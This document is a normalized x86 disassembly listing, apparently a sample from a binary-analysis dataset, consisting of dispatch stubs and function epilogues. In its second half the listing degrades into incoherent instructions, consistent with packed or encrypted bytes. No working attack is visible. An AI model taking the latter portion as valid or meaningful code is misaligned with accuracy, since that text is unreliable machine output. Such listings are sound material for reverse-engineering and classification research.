sub_4711a8
retn
sub_4711ac
mov eax 0x41
call sub_471b2c
jmp eax
sub_4711b8
retn
sub_4711bc
mov eax 0x42
call sub_471b2c
jmp eax
sub_4711c8
retn
sub_4711cc
mov eax 0x43
call sub_471b2c
jmp eax
sub_4711d8
retn
sub_4711dc
mov eax 0x44
call sub_471b2c
jmp eax
sub_4711e8
retn
sub_4711ec
mov eax 0x45
call sub_471b2c
jmp eax
sub_4711f8
retn
sub_4711fc
mov eax 0x46
call sub_471b2c
jmp eax
sub_471208
retn
sub_47120c
mov eax 0x47
call sub_471b2c
jmp eax
sub_471218
retn
sub_47121c
mov eax 0x48
call sub_471b2c
jmp eax
sub_471228
retn
sub_47122c
mov eax 0x49
call sub_471b2c
jmp eax
sub_471238
retn
sub_47123c
mov eax 0x4a
call sub_471b2c
jmp eax
sub_471248
retn
sub_47124c
mov eax 0x4b
call sub_471b2c
jmp eax
sub_471258
retn
sub_47125c
mov eax 0x4c
call sub_471b2c
jmp eax
sub_471268
retn
sub_47126c
mov eax 0x4d
call sub_471b2c
jmp eax
sub_471278
retn
sub_47127c
mov eax 0x4e
call sub_471b2c
jmp eax
sub_471288
retn
sub_47128c
mov eax 0x4f
call sub_471b2c
jmp eax
sub_471298
retn
sub_47129c
mov eax 0x50
call sub_471b2c
jmp eax
sub_4712a8
retn
sub_4712ac
mov eax 0x51
call sub_471b2c
jmp eax
sub_4712b8
retn
sub_4712bc
mov eax 0x52
call sub_471b2c
jmp eax
sub_4712c8
retn
sub_4712cc
mov eax 0x53
call sub_471b2c
jmp eax
sub_4712d8
retn
sub_4712dc
mov eax 0x54
call sub_471b2c
jmp eax
sub_4712e8
retn
sub_4712ec
mov eax 0x55
call sub_471b2c
jmp eax
sub_4712f8
retn
sub_4712fc
mov eax 0x56
call sub_471b2c
jmp eax
sub_471308
retn
sub_47130c
mov eax 0x57
call sub_471b2c
jmp eax
sub_471318
retn
sub_47131c
mov eax 0x58
call sub_471b2c
jmp eax
sub_471328
retn
sub_47132c
mov eax 0x59
call sub_471b2c
jmp eax
sub_471338
retn
sub_47133c
mov eax 0x5a
call sub_471b2c
jmp eax
sub_471348
retn
sub_47134c
mov eax 0x5b
call sub_471b2c
jmp eax
sub_471358
retn
sub_47135c
mov eax 0x5c
call sub_471b2c
jmp eax
sub_471368
retn
sub_47136c
mov eax 0x5d
call sub_471b2c
jmp eax
sub_471378
retn
sub_47137c
mov eax 0x5e
call sub_471b2c
jmp eax
sub_471388
retn
sub_47138c
mov eax 0x5f
call sub_471b2c
jmp eax
sub_471398
retn
sub_47139c
mov eax 0x60
call sub_471b2c
jmp eax
sub_4713a8
retn
sub_4713ac
mov eax 0x61
call sub_471b2c
jmp eax
sub_4713b8
retn
sub_4713bc
mov eax 0x62
call sub_471b2c
jmp eax
sub_4713c8
retn
sub_4713cc
mov eax 0x63
call sub_471b2c
jmp eax
sub_4713d8
retn
sub_4713dc
mov eax 0x64
call sub_471b2c
jmp eax
sub_4713e8
retn
sub_4713ec
mov eax 0x65
call sub_471b2c
jmp eax
sub_4713f8
retn
sub_4713fc
mov eax 0x66
call sub_471b2c
jmp eax
sub_471408
retn
sub_47140c
mov eax 0x67
call sub_471b2c
jmp eax
sub_471418
retn
sub_47141c
mov eax 0x68
call sub_471b2c
jmp eax
sub_471428
retn
sub_47142c
mov eax 0x69
call sub_471b2c
jmp eax
sub_471438
retn
sub_47143c
mov eax 0x6a
call sub_471b2c
jmp eax
sub_471448
retn
sub_47144c
mov eax 0x6b
call sub_471b2c
jmp eax
sub_471458
retn
sub_47145c
mov eax 0x6c
call sub_471b2c
jmp eax
sub_471468
retn
sub_47146c
mov eax 0x6d
call sub_471b2c
jmp eax
sub_471478
retn
sub_47147c
mov eax 0x6e
call sub_471b2c
jmp eax
sub_471488
retn
sub_47148c
mov eax 0x6f
call sub_471b2c
jmp eax
sub_471498
retn
sub_471bcf
jmp sub_403988
sub_471bd6
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471cd1
jmp sub_403988
sub_471cd8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_471d3c
jmp sub_403988
sub_471d43
pop ebp
retn
sub_471d48
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_471be0
sub_471d7d
jmp sub_403988
sub_471d84
pop ebp
retn
sub_471d88
sub [ rw-data ] 0x1
retn
sub_471e00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_472014
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_472020
retn
sub_4720c7
jmp sub_403988
sub_4720ce
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_472126
jmp sub_403988
sub_47212d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472134
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403558
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_472154
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_4725d2
jmp sub_403988
sub_4725d9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4726cb
jmp sub_403988
sub_4726d2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_472760
jmp sub_403988
sub_472767
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_472795
jmp sub_403988
sub_47279c
pop ebp
retn
sub_4727a0
sub [ rw-data ] 0x1
retn
sub_47298e
lea eax [ ebp - 0x194 ]
call sub_404008
retn
sub_47299a
jmp sub_403988
j_sub_47298e
jmp sub_47298e
sub_4729a1
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_472a7c
jmp sub_403988
sub_472a83
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472b17
jmp sub_403988
sub_472b1e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472b94
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472cd8
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472d8b
jmp sub_403988
sub_472d92
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_472e6d
jmp sub_403988
sub_472e74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473060
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47306c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_473084
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473090
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403800#2
jmp sub_403800
sub_473169
jmp sub_403988
sub_473170
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036d4#3
jmp sub_4036d4
sub_473299
jmp sub_403988
sub_4732a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4732ac
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4732b8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47335e
jmp sub_403988
sub_473365
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473421
jmp sub_403988
sub_473428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473445
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_47343e
jmp sub_403988
sub_473445
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_473513
jmp sub_403988
sub_47351a
pop ebx
mov esp ebp
pop ebp
retn
sub_473523
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4735c6
jmp sub_403988
sub_4735cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473666
jmp sub_403988
sub_47366d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4736f2
jmp sub_403988
sub_4736f9
pop ecx
pop ebp
retn
sub_4736fc
mov eax [ eax + 0x4 ]
retn
sub_47375a
jmp sub_403988
sub_473761
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47383d
jmp sub_403988
sub_473844
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473885
jmp sub_403988
sub_47388c
pop ebp
retn
sub_473890
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_473388
sub_4738e1
jmp sub_403988
sub_4738e8
pop ebp
retn
sub_4738ec
sub [ rw-data ] 0x1
retn
sub_4739cf
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add ah bl
cmp [ edi ] eax
adc [ edx ] eax
cmp [ cs : eax + eax ] eax
add [ eax ] al
int3
sub_473a00
adc [ ebx ] eax
xor [ cs : ecx ] dh
add al 0x0
add [ eax ] al
int3
sub_473a20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c6a8
pop esi
pop ebx
retn
sub_473a34
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_473b7f
jmp sub_403988
sub_473b86
pop ebx
pop ecx
pop ebp
retn
sub_473b94
cmp eax edx
ja r-xdata
or ecx 0xffffffff
sub ecx eax
add edx ecx
mov eax edx
retn
sub edx eax
mov eax edx
retn
sub_473c71
jmp sub_403988
sub_473c78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473d48
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_473d5c
call sub_40460c
retn
sub_473e17
jmp sub_403988
sub_473e1e
pop ebp
retn
sub_473ef3
jmp sub_403988
sub_473efa
pop ecx
pop ebp
retn
sub_474028
retn
j_sub_474028
jmp sub_474028
sub_474030
pop ebp
retn
sub_474034
sub [ rw-data ] 0x1
retn
sub_47422a
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_474233
jmp sub_403988
j_sub_47422a
jmp sub_47422a
sub_47423a
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_474315
jmp sub_403988
sub_47431c
pop ebp
retn
sub_474320
sub [ rw-data ] 0x1
retn
sub_47457a
jmp sub_403988
sub_474581
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_474607
jmp sub_403988
sub_47460e
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a8
sub_4746cb
jmp sub_403988
sub_4746d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4747fc
jmp sub_403988
sub_474803
pop ebp
retn
sub_474808
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_474774
call sub_403d30
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d044
mov [ rw-data ] eax
sub_474914
retn
sub_474918
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_47494c
retn
sub_474950
retn
sub_474979
jmp sub_403988
sub_474980
pop ebp
retn
sub_474984
sub [ rw-data ] 0x1
retn
j_sub_403988#9
jmp sub_403988
sub_474c1f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
sub_474c28
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
retn
sub_474c9c
mov eax [ eax + 0x6c ]
shl eax 0x3
retn
sub_474ca4
push ebx
cmp cl 0x1
jne r-xdata
call sub_420a30
pop ebx
retn
cmp edx [ eax + 0x68 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x68 ] ebx
j_sub_403988#8
jmp sub_403988
sub_474d25
pop ebx
pop ecx
pop ebp
retn
sub_474d2c
mov ecx [ eax + 0x68 ]
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x50 ]
retn
sub_474e20
shr edx 0x3
mov [ eax + 0x6c ] edx
retn
sub_474e4d
jmp sub_403988
sub_474e54
pop ebp
retn
sub_474e58
sub [ rw-data ] 0x1
retn
sub_474e85
jmp sub_403988
sub_474e8c
pop ebp
retn
sub_474e90
sub [ rw-data ] 0x1
retn
sub_475399
jmp sub_403988
sub_4753a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403800
jmp sub_403800
j_sub_403800#7
jmp sub_403800
j_sub_4036d4#2
jmp sub_4036d4
j_sub_4036d4
jmp sub_4036d4
sub_47598b
jmp sub_403988
sub_475992
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4759dd
jmp sub_403988
sub_4759e4
pop ebp
retn
sub_4759e8
sub [ rw-data ] 0x1
retn
j_sub_403988#7
jmp sub_403988
sub_475f87
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403988#6
jmp sub_403988
j_sub_403988#5
jmp sub_403988
sub_476138
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4762b1
jmp sub_403988
sub_4762b8
pop ebp
retn
sub_4762bc
sub [ rw-data ] 0x1
retn
sub_4762e9
jmp sub_403988
sub_4762f0
pop ebp
retn
sub_4762f4
sub [ rw-data ] 0x1
retn
j_sub_403988#4
jmp sub_403988
sub_476328
pop ebp
retn
sub_47632c
sub [ rw-data ] 0x1
retn
sub_476359
jmp sub_403988
sub_476360
pop ebp
retn
sub_476364
sub [ rw-data ] 0x1
retn
j_sub_403988#3
jmp sub_403988
sub_476398
pop ebp
retn
sub_47639c
sub [ rw-data ] 0x1
retn
sub_4763c9
jmp sub_403988
sub_4763d0
pop ebp
retn
sub_4763d4
sub [ rw-data ] 0x1
retn
j_sub_403988#2
jmp sub_403988
sub_4766fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476719
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_476712
jmp sub_403988
sub_476719
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4768f1
jmp sub_403988
sub_4768f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_476904
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_476984
mov eax [ eax + 0x68 ]
call sub_476000
retn
sub_476a00
jmp sub_403988
sub_476a07
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476a80
jmp sub_403988
sub_476a87
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403800#5
jmp sub_403800
j_sub_403988
jmp sub_403988
sub_476c44
pop ebp
retn
sub_476c48
sub [ rw-data ] 0x1
retn
sub_476f28
nop
add ecx edx
jae r-xdata
xor [ ecx ] al
retn
call sub_403174
sub_476ff5
jmp r-xdata
mov edi 0xf21da4f0

sub_477018
sbb eax 0xf0bf36f2
movsb [ edi ] [ esi ]
sbb eax 0xf0cb26f2
mov [ 0x292b9222 ] eax
jpo r-xdata
sbb eax 0x23613ef2
adc [ 0x673ef21d ] edx
jmp r-xdata
or al [ eax ]
add [ ebx + 0x5 ] dh
call sub_403174
j_sub_477033
jmp sub_477033
sub_4770ef
dec bh
add [ esp + eax * 4 - 0x6c420fd5 ] 0xffffff9b
arpl [ ebx + 0x7b ] di
and ah [ edx ]
xchg edx eax
test eax 0xeb7b7b52
jmp r-xdata
j_sub_477181
jmp sub_477181
sub_47712f
xchg edi eax
sub ch [ edx ]
sub al 0x92
shr [ esi + 0x7b ] 0x7b
j_sub_47712f
jmp sub_47712f
j_sub_477150
jmp sub_477150
j_sub_4771b0
jmp sub_4771b0
j_sub_47719b
jmp sub_47719b
sub_47723e
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
jmp r-xdata
sub_4772db
jmp r-xdata
jmp sub_4772dd
j_sub_4772db
jmp sub_4772db
j_sub_4772dd
jmp sub_4772dd
j_sub_477345
jmp sub_477345
sub_4773bd
mov bl 0x86
test [ ebx + edx * 4 + 0x7b7b3d90 ] al
sub esi esi
test bh 0x83
test [ edx + edx * 4 + 0x7b7b5d70 ] al
jmp j_sub_477345
sub_4773e5
jmp r-xdata
jmp j_sub_477345
j_sub_4773e5
jmp sub_4773e5
sub_47741b
adc ebp esi
sahf
shr ah cl
xchg edx eax
adc ah [ ebp + 0x7b ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
jmp sub_4773ef
sub_477478
test [ ebx ] cl
jae r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
j_sub_477521
jmp sub_477521
sub_477521
xchg eax esi
pop es
not [ ebx - 0x4a0f72b8 ]
j_sub_477df5
jmp sub_477df5
j_sub_477ecf
jmp sub_477ecf
sub_477e86
dec eax
mov dl 0x1d
test [ ss : edx - 0x7b7b77a5 ] edx
jmp sub_477e7e
sub_477ebe
sub_477ecf
jpo r-xdata
0xeb84848d 0xebeb
jmp sub_477ee8
jmp sub_477ebe
sub_477f43
jmp edx
sub_477f67
dec eax
jpo r-xdata
jmp sub_47805b
xchg edx eax
retn 0x8487
sub_477f71
pop edi
sub_477f75
and bh [ eax - 0x6d78c110 ]
sub esi [ ebx + edi * 2 + 0x7b ]
jmp sub_477f6c
j_sub_477f75
jmp sub_477f75
sub_478000
idiv [ edi ]
pop edi
push esp
xchg edx eax
0x8489
j_sub_4781dc
jmp sub_4781dc
sub_4781df
rcl [ ebx + 0x7b7b40a7 ] cl
sub_4781e6
mov ebx 0x840fff74
test [ edx + edx * 4 + 0x7b7b5480 ] al
jmp sub_4781df
sub_47822a
retn
j_sub_478319
jmp sub_478319
sub_47833c
mov [ edx + 0x7b7b4bd3 ] dl
jmp r-xdata
j_sub_478362
jmp sub_478362
j_sub_4783ba
jmp sub_4783ba
sub_4783dd
jmp r-xdata
sub_4783e0
je r-xdata
inc edx
add [ esp + eax * 4 + 0x3992b3f0 ] 0xeb7b7b54
jmp sub_4783db
retn 0x8481
j_sub_4783dd
jmp sub_4783dd
j_sub_4783df
jmp sub_4783df
j_sub_4783e0
jmp sub_4783e0
j_sub_478490
jmp sub_478490
sub_4784f5
push ds
xchg edx eax
retn 0x7b77
sub_478570
retn
sub_478670
jmp r-xdata
sub_478671
jmp r-xdata
mov [ 0xffffffff8485e392 ] al
test bl ch
jmp r-xdata
and [ 0xfffffffff03126f2 ] bl
mov [ 0x3726f21d ] eax
sub_478673
xchg ebx eax
sub_478681
jmp r-xdata
jmp r-xdata
aaa
j_sub_478670
jmp sub_478670
j_sub_478671
jmp sub_478671
j_sub_478673
jmp sub_478673
sub_47868b
xchg [ esp + eax * 4 - 0x7b6f426e ] al
test bl ch
jmp sub_478681
sub_4786ba
jmp r-xdata
adc [ eax + 0x487fbd7e ] ah
adc esi eax
jns r-xdata
jpo r-xdata
xchg [ es : edx + 0x7b7b4e4e ] edx
jmp r-xdata
mov ebx 0x7ea0107e
and edi [ ecx + 0x10 ]
jmp r-xdata
mov ebp 0xf013487f
adc [ ebx + 0x7ea0107e ] bh
j_sub_4786ba#2
jmp sub_4786ba
j_sub_4786ba
jmp j_sub_4786ba#2
sub_4786e6
push ebx
je r-xdata
hlt
sub_478704
and [ ecx ] edx
sbb [ 0x21192ef2 ] ebx
sbb eax 0x111f2ef2
sbb al 0x21
xchg edx eax
jmp r-xdata
xchg ebp eax
xchg edx eax
leave
insb
sub_47871d
imul esi edx 0x3f
pop edi
pop ebx
sub_47871e
aas
pop edi
pop ebx
sub_47871f
aas
pop edi
pop ebx
sub_478734
jmp r-xdata
pop ebx
j_sub_478729
jmp sub_478729
sub_478743
jmp r-xdata
jmp sub_47871d
sub_478745
jmp r-xdata
jmp sub_47871f
j_sub_478734#3
jmp sub_478734
j_sub_478729#2
jmp j_sub_478729
sub_47874a
adc esi [ esi - 0x6d42f049 ]
adc [ edi - 0x14147b7c ] ecx
jmp sub_478743
j_sub_478745
jmp sub_478745
j_sub_478734
jmp j_sub_478734#3
sub_478762
sbb eax 0x92953ef2
leave
insb
sub_478769
jpo r-xdata
stosb [ edi ]
bound edi [ ebx + 0x7b ]
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
jmp j_sub_478745
j_sub_478734#2
jmp j_sub_478734
j_sub_478704
jmp sub_478704
sub_4787d8
mov ebx 0xebebb8b2
jmp r-xdata
jmp r-xdata
jpo r-xdata
or al 0x1d
test eax 0x1d0f1122
[ edi ]
xchg edx eax
0x7b40
sub_4787df
mov esp [ ebx ]
adc [ esi - 0x6e ] ebx
stosb [ edi ]
bound edi [ ebx + 0x7b ]
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
j_sub_4788f0
jmp sub_4788f0
sub_4788cc
and edx [ edx + 0x7b7b6d26 ]
jmp r-xdata
jmp sub_4788ac
j_sub_4788d6
jmp sub_4788d6
sub_478a55
push es
xchg ebx eax
and al 0x11
dec edi
xchg edx eax
mov [ 0xffffffffeb7b7b5d ] eax
jmp r-xdata
xchg edx eax
j_sub_478a50
jmp sub_478a50
j_sub_479270
jmp sub_479270
sub_479248
sub [ eax ] ch
xchg edx eax
adc al 0xa4
test [ esp + eax * 4 + 0x7b7b93ec ] al
jpo r-xdata
movsb [ edi ] [ esi ]
mov ebx 0x27fef62b
xchg [ esp + eax * 4 + 0x730e842b ] al
idiv [ esi ]
sub_479265
scasd [ edi ]
sub esi esi
sub_4792b0
mov [ edi + edi * 8 + 0x28 ] dh
xchg ebp eax
test [ ebx + edx + 0x7b7b737b ] al
idiv dh
fisttp [ esi + 0x2b288484 ]
xchg edx eax
or ebp [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
adc eax 0x9f2ef21d
j_sub_479345
jmp sub_479345
sub_4793bf
push ecx
sub_479404
imul esi esi 0x3e

j_sub_479421
jmp sub_479421
sub_479438
xchg eax esi
xchg [ edx - 0x44b71448 ] esi
cmp esp [ edx + esi * 4 ]
mov eax 0xebebebeb
jmp r-xdata
xchg eax esi
sub_4794af
sub_4794b0
mov bl 0x93
mov al [ 0xffffffff848484a7 ]
maxps xmm4 [ ebx - 0x10 ]
mov ebp 0x848c9a92
test bl ch
jmp sub_4794af
sub_47952e
[ edi + 0x2d8484a1 ]
sub_47953c
sub_47953e
j_sub_47953c
jmp sub_47953c
j_sub_47953e
jmp sub_47953e
j_sub_4795cb
jmp sub_4795cb
sub_479557
stc
push esp
pop [ esp + eax * 4 - 0x7b66e96d ]
test al dh
mov edx [ edx - 0x7b7b79c4 ]
jmp j_sub_4795cb
sub_4795cb
mov ecx 0x2e7b7b76
sub_4795de
adc ebp [ ebx - 0x6d848586 ]
pop ss
mov es [ esp + eax * 4 - 0x109d7d8 ]
add eax [ esi + 0x282b8484 ]
test [ ebx + ebp ] ch
inc eax
mov eax 0x7b73e192
jpo r-xdata
sub [ eax ] ch
jmp r-xdata
idiv dh
sub_479629
aas
pop edi
outsd
inc eax
cmp al 0x7f
je r-xdata
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
sbb eax 0x743d3842
[ edi ]
sub_47969e
push cs
outsd
sub_4796a2
jae r-xdata
push cs
xchg [ ebx ] ebp
test [ esi ] cl
outsd
jmp r-xdata
imul eax [ esi + ecx + 0x7dfa9277 ] 0x7b
jpo r-xdata
sub eax [ esi + ecx + 0x733ef06f ]
test [ esi ] cl
j_sub_47969e
jmp sub_47969e
j_sub_4796a2
jmp sub_4796a2
sub_479777
xchg edx eax
xchg edx eax
popfd
test [ edx + esi * 4 + 0x13ebebb8 ] al

sub_4799e2
and bh al
cmp [ edx + 0x74 ] 0xffffffff
and [ edi - 0x9097b7c ] esp
mov bl 0x86
test [ esi + esi * 8 - 0x7b722802 ] al
test [ ebx + 0x7b7b7aef ] dl
sub_4799fe
mov bl 0x93
hlt
sub_479a02
jpo r-xdata
xchg edx eax
rol [ edi - 0x14147b7c ] 0x1
sub dh dh
sub_479a0e
xchg [ esp + eax * 4 - 0x14141415 ] eax
jmp sub_479a02
sub_479a4d
jmp r-xdata
jmp r-xdata
adc edx eax
mov es [ esi ]
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
test [ ebx + ebp * 8 + 0x68ed013 ] al
j_sub_4799e2
jmp sub_4799e2
j_sub_479a7b
jmp sub_479a7b
j_sub_479a4d
jmp sub_479a4d
sub_479a7b
retn 0x84ad
j_sub_479a73
jmp sub_479a73
j_sub_479a0e
jmp sub_479a0e
j_sub_479ad0
jmp sub_479ad0
j_sub_479aef
jmp sub_479aef
j_sub_479af0
jmp sub_479af0
j_sub_479b00
jmp sub_479b00
sub_479b37
[ edi + 0x5a ]
sub_479b9b
mov ebx 0x7b767192
jpo r-xdata
jmp r-xdata
jmp sub_479b8f
j_sub_479c25
jmp sub_479c25
j_sub_479c56
jmp j_sub_479c56#2
j_sub_479c56#2
jmp sub_479c56
j_sub_479d68
jmp sub_479d68
sub_479e97
jmp [ ebp + 0x63 ]
sub_479fce
xchg edx eax
stosd [ edi ]
push 0xebeb7b7b
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
xor edx 0x2e
j_sub_479fce
jmp sub_479fce
sub_47a032
idiv dh
stosd [ edi ]
xchg [ esp + eax * 4 - 0x310dd7d5 ] al
stosd [ edi ]
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
sub_47a05d
mov edx 0xebebb8b2
jmp r-xdata
sbb [ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
sub_47a067
jmp r-xdata
sub_47a069
jmp r-xdata
xchg edx eax
retn
sub_47a06e
cmp eax 0xa5a4922b
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp sub_47a067
j_sub_47a069#2
jmp sub_47a069
j_sub_47a069
jmp j_sub_47a069#2
sub_47a09e
sbb eax 0x23593ef2
adc [ ebx ] eax
xchg edx eax
xchg [ ecx + 0x282b8484 ] ecx
sub [ edx + 0x7b7b6b7b ] dl
xchg edx eax
imul esp [ ecx - 0x14147b7c ] 0x3ef21deb
xchg ecx eax
and edx [ ecx ]
adc dl [ edx - 0x7b7b60e9 ]
jmp r-xdata
sub_47a17e
j_sub_47a181#2
clc
j_sub_47a181
jmp j_sub_47a181#2
j_sub_47a181#3
jmp sub_47a181
sub_47a1f6
push es
sub_47a1fa
test [ 0xfffffffff03b2ef2 ] bl
mov [ 0xffffffff8484bf92 ] eax
test bl ch
jmp r-xdata
jmp sub_47a213
j_sub_47a1f6
jmp sub_47a1f6
j_sub_47a1fa
jmp sub_47a1fa
sub_47a299
mov ebx 0x7b69ec92
jpo r-xdata
jmp sub_47a278
jmp r-xdata
j_sub_47a512
jmp sub_47a512
j_sub_47a5aa
jmp sub_47a5aa
sub_47a58d
mov ebx 0x1d031121
mov ecx 0x9ebb9221
test [ edx + edx * 4 - 0x7b7b6dbf ] al
jmp r-xdata
mov ebx 0x1d031121
sub_47a5c2
jmp r-xdata
mov ebx 0x7b718c92
jpo r-xdata
xchg [ eax - 0x60 ] ecx
xchg edx eax
hlt
jmp r-xdata
mov al [ 0xffffffff84acf492 ]
test [ ebx + 0x7b7b6253 ] dl
sub_47a5c4
aas
[ eax - 0x60 ] ecx
xchg edx eax
hlt
sub_47a6d2
xchg edx eax
imul ebp [ ecx + 0x7b ] 0xebebeb7b
jmp r-xdata
xchg ebp eax
test [ eax + edi * 8 + 0x4253833e ] al
sub_47a6e2
mov ebx 0x911d922b
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47a6fb
scasd [ edi ]
xchg [ esp + eax * 4 - 0x18b4402 ] al
xor [ esp + eax * 4 + 0x20243b84 ] ebx
mov dl 0xb8
jmp r-xdata
sub_47a6fd
test [ esi + edi * 8 + 0x31fe74bb ] al
pushfd
test [ ebx + edi - 0x474ddfdc ] al
jmp r-xdata
j_sub_47a6fb
jmp sub_47a6fb
j_sub_47a6fd
jmp sub_47a6fd
sub_47a712
[ ecx ] 0x1f
sub al 0x84
in eax dx

sub_47a71e
sub al 0x84
in eax dx
iretd
sub_47a726
and [ edx - 0x7b7b5ef0 ] dl
jmp sub_47a71e
sub_47a72e
imul esi [ ebx ] 0x74
int3
sub_47a78b
sub edx [ edx - 0x7b7b6edc ]
jmp sub_47a77e
sub_47a796
mov ch 0x7c
jpo r-xdata
test bl ch
jmp j_sub_47a7de
jmp sub_47a787
j_sub_47a796
